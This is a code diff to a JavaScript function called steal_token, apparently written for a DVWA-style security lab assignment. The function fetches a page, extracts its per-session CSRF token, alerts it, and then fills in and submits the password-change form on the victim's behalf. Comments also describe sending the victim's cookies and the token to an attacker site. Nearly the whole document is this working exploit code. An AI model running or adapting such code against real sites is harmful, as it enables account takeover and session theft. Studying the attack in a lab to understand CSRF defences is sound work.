@@ -9,9 +9,8 @@ function steal_token(url){
     var xhr = new XMLHttpRequest();
     xhr.responseType = "document"; //parse html
     xhr.open("GET", url);
-    xhr.send(null);
-    xhr.onload = function(){
 
+    xhr.onload = function(event){
         // extract form and use csrf token embedded
         var dom = xhr.responseXML;
         var form = dom.forms[0];
@@ -19,10 +18,12 @@ function steal_token(url){
         //csrf token is vulnerable because it is generated
         //per session, not per request
 
+        alert('CSRF TOKEN STOLEN:' + form[3].value);
+
         //ideally send document.cookie and
         //csrf token in form[3].value to 
         //attacker site, which should exploit these
-        //as I do not currently have a webserver (github is static)
+        //I do not currently have a webserver (github is static)
         //I demonstrate the second part below
 
         //The attacker constructs a form on their
@@ -33,11 +34,11 @@ function steal_token(url){
         form[0].value='hello';
         form[1].value=form[0].value;
 
-        //change action from # to /PA4/vulnerabilities/csrf/
+        // //change action from # to /PA4/vulnerabilities/csrf/
         form.action = url;
 
-        // set value for <input name='Change'>
-        // attach input to form
+        // // set value for <input name='Change'>
+        // // attach input to form
         var change = document.createElement('input');
         change.name = 'Change';
         change.value = 'Change';
@@ -49,9 +50,11 @@ function steal_token(url){
         //form submit
         //return false to prevent redirect
         form.submit(function(event){
+            event.preventDefault();
             return false;
         });
-    }
+    };
+    xhr.send(null);
 }
 
 //csrf token
